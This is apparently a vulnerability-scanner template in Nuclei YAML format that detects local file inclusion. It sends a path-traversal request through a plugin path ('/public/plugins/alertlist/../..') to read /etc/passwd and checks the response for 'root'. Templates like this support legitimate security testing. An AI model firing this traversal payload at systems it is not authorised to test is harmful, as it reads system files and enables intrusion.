id: lfi-detect

info:
  name: LFI
  author: rix4uni
  severity: Medium
  reference:
    - https://hackerone.com/reports/1419213
  metadata:
    verified: true
  tags: lfi,tech

requests:
  - method: GET
    path:
      - '{{BaseURL}}/public/plugins/alertlist/../../../../../../../../../../../../../../../../../../../etc/passwd'

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'root'
      - type: status
        status:
          - 200